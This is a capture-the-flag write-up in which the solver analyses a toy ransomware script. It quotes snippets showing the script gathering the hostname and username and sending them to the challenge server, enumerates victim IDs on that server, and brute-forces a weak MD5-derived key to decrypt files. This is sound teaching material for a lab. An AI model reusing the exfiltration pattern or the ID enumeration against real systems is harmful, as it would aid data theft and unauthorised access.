# Yikes
> Little Timmy needs your help again! Looks like he accidentally downloaded some ransomware when he was looking for a way to get free robux. He really needs his math homework if you can help him out? Oh, and he also told me that one of his friends tried the same thing and has a really important video he needs to recover. I trust you'll be able to help them both! Hopefully the ransomware group doesn't really know what they're doing?

## First Look/Analysis

We have access to the ransomware python file, `ignore.py`, it is originally a hidden folder `.igonor.py` but i renamed it to `ignore.py` to make it easier to work with.

In the chal file we also have a ransom.txt file that contains some information. 

first up is a link "https://yikes.ctf-league.osusec.org/ransom/?id=3" to go to if we want to get Timmies homework back, and on the site it just tells us to pay up. 

Looking further into the `ignore.py` file we can see that it encodes everything and sends the encoded data to the server. 

```python
    victimData = {
        "hostname": hostname,
        "username": username,
        "time": time,
    }
    victimEnc = urllib.parse.urlencode(victimData).encode("utf-8")
    keyrRq = urllib.request.Request(baseURl + "/victim", data=victimEnc)
    keyrsp = urllib.request.urlopen(keyrRq)
```

here we can see it takes the data, the hostname, the username and the time, along with the users encrypted data and sends it to their server.

the server address is hard coded into the code, along with how the hostname/username is retrieved

we also see the key used to encrypt the data is generated using the following code and information listed above

```python
baseURl = "https://yikes.ctf-league.osusec.org"
hostname= platform.node()
username=getpass.getuser()
randomThing = randint(1, 1333337)
time =datetime.date.today().isoformat()
secretkey = md5((hostname + str(randomThing) + time).encode()).digest()
```

combining all these bits of information we can see that Timmies "id" used on their site is 3, and they store their victims user data on their server, following this address: `https://yikes.ctf-league.osusec.org/victim`

we also know that they store the hostname, username, and time of the victim with this data, which will help with finding a key later on.

### flag 1

my first thought with all these clues listed is how do we access Timmies information on their server, because they store his data, and key related information on their server.

I simply tried to access it by adding `/3` to the end of the url, and it worked!

so the full address is: `https://yikes.ctf-league.osusec.org/victim/3`

this brings us to timmies information:

```json
{
    "cost": 5.3,
    "due": "2024-11-24",
    "files_url": "https://yikes.ctf-league.osusec.org/files/3",
    "hostname": "osu{loose_lips_sink--oh_wait_wrong_metaphor}",
    "id": 3,
    "key_url": "https://yikes.ctf-league.osusec.org/key/3",
    "time": "2024-11-22",
    "username": "xX_LITTLE_TIMMY_Xx"
}
```

here we can see the hostname is in the format of a flag, it is our first flag:

```shell
osu{loose_lips_sink--oh_wait_wrong_metaphor}
```

We also see that we can download Timmies encrypted files, see the time, username, and hostname which were used to encrypt his data.

## Getting Timmies Homework analysis

in the downloaded files in "3" we can see that timmies hw is there, along with some other things but we are only interested in the hw for now since that is one of the ctf objectives

the file is encrypted, and we need to decrypt it to get the flag

we already have part of the key

```python
key = "osu{loose_lips_sink--oh_wait_wrong_metaphor}" + str(randomThing) + "2024-11-22"
```

the randomThing is a number between 1 and 1333337 following this piece of code from the encryption program

```python
randomThing = randint(1, 1333337)
```

this is a reasonably small number to try and brute force the encryption key, so we can try to brute force the key by trying all the numbers between 1 and 1333337

But how do we know if we have the right key?

we can't just check if the key format is in the file, its not plain text, its a pdf file, so we need some other way to verify the encryption key

using a wiki article we can see that each file has a header, and these headers are unique to the file type, so we can check the header of the file to see if we have the right key

> source: https://en.wikipedia.org/wiki/List_of_file_signatures

here we are looking specifically for a pdf file header, which is `%PDF-` or '25 50 44 46 2D' in hex

with this information we can write a script to brute force the key, and check the header of the file to see if we have the right key

the script I created is called `brute_force_decrypt.py` and is in the same directory as this writeup

To reference a Python file in Markdown, you can use backticks to create a code block and specify the language as `python`. Here is an example:

\[brute_force_decrypt\](ctf-writeups/osusec-league-2024/yikes/brute_force_decrypt.py)

essentially what it does is xor the encrypted file with a randomly generated key, and then check the header of the file to see if it is a pdf file

running this code we do get a positive hit on a succesfully decrypted pdf file, and we can see the key and the file in our output

> I put this file within ctf-file/decrpyted-files to make it organized

```shell
Key found! randomThing: 502651
```

and within the pdf file we can see a hand written flag:

![alt text](image.png)

### flag 2

```shell
osu{thanx_4_ur_halp}
```
Sweet, so we now have the second flag, a valid key, and a final objective to complete, save Timmmies friends video

## Getting Timmies Friends Video analysis

So we know gotta gather information on Timmies friend, we don't know his name or his user name, or really anything about him, but we do know that he tried the same thing as Timmy, and that he has a video that he needs to recover

within Timmies data we can see another encrypted file named: 'xX_jimjam_Xx.txt.ohio' which to be honest is a pretty good indicator of who Timmies friends user name is, but I decided to decrypt this file just to be sure.

I used a similar script to before, I just modified it to have a hardcoded key value and not check for the header, since we know this key will work. 

this script is known as "known_key_decrypt.py" and is in the same directory as this writeup

\[brute_force_decrypt\](ctf-writeups/osusec-league-2024/yikes/known_key_decrypt.py)

running this script we get the decrypted file, and it pretty much confirms that the user name is "xX_jimjam_Xx"

```txt
xX_LITTLE_TIMMY_Xx: u free?
xX_jimjam_Xx: yah! already on fortnite no cap
xX_LITTLE_TIMMY_Xx: yay
=======================
xX_LITTLE_TIMMY_Xx: cringe my mom's making me get off, hoemwork or smth
xX_jimjam_Xx: it's so joever
xX_LITTLE_TIMMY_Xx: ya
xX_LITTLE_TIMMY_Xx: cya tomorrow probably..
xX_jimjam_Xx: stay sigma
=======================
xX_LITTLE_TIMMY_Xx: WANT FREE ROBUX? I USED THIS TOOL AND GOT 139487 INSTANTLY
xX_LITTLE_TIMMY_Xx: <attached free_robux.exe>
xX_jimjam_Xx: yo that's so cool!
xX_jimjam_Xx: wait timmy your aura seems off is that u?
xX_jimjam_Xx: timmy?
```

so where do we go from here, we have to get jimjams video back, but we don't have the hostname, time or even his data to decrypt the file.

we do know where the information is stored on their site so we go back to where we found Timmies information, and try to access jimjams information

the full address is: `https://yikes.ctf-league.osusec.org/victim/3`

but how do we find jimjams information, we don't know his id.

so we just try random different id's, and lower values work, there is info for id 1 and 2, and 4. But how many is there.

I tried 1000, nothing showed, I tried 500, nothing showed, 250, nothing, 125, nothing, 75, nothing, 35, nothing 24... Something showed!

28? yep, 34, nope, 30 yes, 32, no, 31 no, so there is a max of 30 victims, and we know jimjam is one of them

so I just manually go through and check each one until I find jimjams username, he is id 17.

>https://yikes.ctf-league.osusec.org/victim/17

```json
{
  "cost": 22.3,
  "due": "2024-11-25",
  "files_url": "https://yikes.ctf-league.osusec.org/files/17",
  "hostname": "jimmypc",
  "id": 17,
  "key_url": "https://yikes.ctf-league.osusec.org/key/17",
  "time": "2024-11-23",
  "username": "xX_jimjam_Xx"
}
```

so we found jimjams information. we download it and make note of the time, username, hostname and id for later

once we download the files we can see that it is a video that is encrypted. 

```shell
super_important_video_final1.mp4.ohio
```

using the same brute force program from before, but changing the mp4 files header, changing the hostname, and time to jimjams information that we found/noted earlier we are able to attempt to brute force it to save the video

> I modified the brute force program to ignore the first 4 bytes of the file, since the mp4 header is 4 bytes long, before there is the 4 bytes we can actually reliabllly check, so we ignore the first 4 bytes of the file

running this program we get a hit on the key! and we can see the video file as well

```shell
key found! randomThing: 1234994
```

### flag 3

once we open up the video file we can see the flag clear as day in the video:

> ignoring the rick roll as well lol

```shell
osu{cant_wait_to_upload_to_youtube_dot_com}
```

>** I do not own nor did I create the content for this challenge. This is a writeup for the challenge that I solved **
